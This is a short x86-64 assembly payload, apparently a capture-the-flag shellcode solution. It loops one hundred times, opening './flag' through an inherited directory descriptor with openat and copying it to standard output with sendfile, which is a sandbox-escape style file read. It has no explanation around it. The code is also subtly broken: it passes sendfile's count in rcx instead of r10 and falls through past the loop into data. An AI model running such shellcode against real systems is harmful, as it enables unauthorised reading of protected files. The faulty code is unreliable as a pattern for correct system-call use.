.global _start
_start:
.intel_syntax noprefix
# Loop 100 times
xor r12, r12    # r12 is guaranteed to be preserved after the function is called
jmp loop_start

go_back:
# openat(3, "./flag", 0); // 0 is O_RDONLY
mov rax, 257
mov rdi, 3
lea rsi, [rip+flag]
mov rdx, 0
syscall

# sendfile(1, 4, 0, 0x80);
mov rdi, 1
mov rcx, 0x80
mov rdx, 0
mov rsi, 4
mov rax, 40
syscall

inc r12

loop_start:
cmp r12, 100
jl go_back


flag:
.string "./flag"
